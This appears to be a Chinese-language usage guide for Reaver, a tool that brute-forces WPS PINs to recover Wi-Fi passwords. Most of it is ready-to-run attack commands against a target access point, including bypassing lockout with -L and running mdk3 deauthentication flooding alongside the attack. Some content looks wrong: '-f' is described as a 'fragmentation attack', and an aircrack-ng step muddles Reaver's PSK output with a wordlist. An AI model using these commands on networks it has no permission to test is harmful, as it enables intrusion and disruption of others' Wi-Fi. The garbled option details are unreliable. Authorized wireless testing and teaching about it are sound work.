# reaver 命令

## 命令说明
Reaver是一款专门用于攻击WPS（Wi-Fi Protected Setup）的工具，它可以利用WPS的漏洞来破解Wi-Fi密码。Reaver通过暴力破解WPS的PIN码，然后获取Wi-Fi的PSK（预共享密钥），是无线网络渗透测试的重要工具。

## 语法
```
reaver [选项]
```

## 常用选项
- `-i <接口>`：指定无线接口
- `-b <BSSID>`：指定接入点的BSSID
- `-c <频道>`：指定频道
- `-vv`：详细模式
- `-L`：忽略锁定状态
- `-S`：使用最小的DH key
- `-f`：启用 fragmentation attack
- `-k <次数>`：设置最大尝试次数
- `-m <MAC>`：指定源MAC地址
- `-e <ESSID>`：指定目标ESSID
- `-p <PIN>`：指定WPS PIN码
- `-h`：显示帮助信息
- `-v`：显示版本信息

## 技术原理

Reaver通过以下步骤工作：

1. 发现支持WPS的接入点
2. 与接入点建立WPS会话
3. 尝试不同的WPS PIN码
4. 验证PIN码是否正确
5. 当找到正确的PIN码时，获取PSK
6. 输出PSK作为Wi-Fi密码

Reaver利用了WPS的设计缺陷，通过暴力破解PIN码来获取Wi-Fi密码。

## 示例

### 基本操作
```bash
# 启动Reaver
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# 指定频道
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -vv

# 指定PIN码
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -p 12345670 -vv

# 忽略锁定状态
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -L -vv
```

### 高级选项
```bash
# 使用最小的DH key
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -S -vv

# 启用 fragmentation attack
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -f -vv

# 设置最大尝试次数
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -k 1000 -vv

# 指定源MAC地址
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -m 00:11:22:33:44:55 -vv
```

### 实际应用
```bash
# 结合airodump-ng发现接入点
airodump-ng wlan0
# 找到目标BSSID和频道后，使用Reaver
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -vv

# 结合wash发现支持WPS的接入点
wash -i wlan0
# 找到目标BSSID后，使用Reaver
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# 恢复之前的会话
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv -s sessionfile
```

## 适用场景

### 无线网络渗透测试
- 测试WPS的安全性
- 评估Wi-Fi网络的安全状况
- 发现WPS漏洞
- 验证Wi-Fi密码的强度

### 网络安全审计
- 定期检查网络的安全状况
- 识别WPS配置错误
- 评估网络的抗攻击能力
- 提供安全加固建议

### 教育和研究
- 学习WPS的工作原理
- 研究无线网络安全
- 开发网络安全工具
- 测试WPS的安全性

### 网络管理
- 测试自己网络的安全性
- 识别网络中的安全漏洞
- 确保网络配置正确
- 提高网络的安全性

### 事件响应
- 分析安全事件中的无线网络攻击
- 评估攻击的影响范围
- 提供事件响应建议
- 加强网络的安全防护

## 高级技巧

### 与其他工具结合
```bash
# 结合airodump-ng和wash进行扫描
airodump-ng wlan0 &
sleep 60
wash -i wlan0

# 结合aircrack-ng进行密码破解
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv -o psk.txt
aircrack-ng -w psk.txt capture.pcap

# 结合mdk3进行干扰
mdk3 wlan0 d -b AA:BB:CC:DD:EE:FF &
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# 结合kismet进行网络分析
kismet -c wlan0 -w capture.pcap &
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv
```

### 性能优化
- 使用支持监听模式的无线网卡
- 选择信号强度好的接入点
- 调整天线位置，提高信号质量
- 减少网络干扰

### 安全注意事项
- 获得授权后再进行测试
- 避免攻击他人的网络
- 遵守相关法律法规
- 妥善处理获取的密码

## 常见问题解决

- **问题**：Reaver无法连接到接入点
  **解决方法**：检查无线网卡是否在监听模式，确保BSSID和频道正确，验证接入点是否支持WPS

- **问题**：Reaver运行速度慢
  **解决方法**：选择信号强度好的接入点，减少网络干扰，使用更强大的硬件

- **问题**：Reaver被锁定
  **解决方法**：使用`-L`选项忽略锁定状态，等待接入点解锁，尝试其他接入点

- **问题**：Reaver无法获取PSK
  **解决方法**：确保接入点支持WPS，尝试不同的攻击方法，检查网络连接

## 总结
Reaver是一款专门用于攻击WPS的工具，它可以利用WPS的漏洞来破解Wi-Fi密码。通过掌握Reaver的使用方法，安全专业人员可以更有效地测试WPS的安全性、评估Wi-Fi网络的安全状况、发现WPS漏洞和验证Wi-Fi密码的强度。

Reaver的优势在于：
- 专门针对WPS漏洞
- 操作简单
- 成功率高
- 与其他工具的良好集成
- 开源免费

作为无线网络渗透测试的重要工具，Reaver是每个安全专业人员必备的工具之一。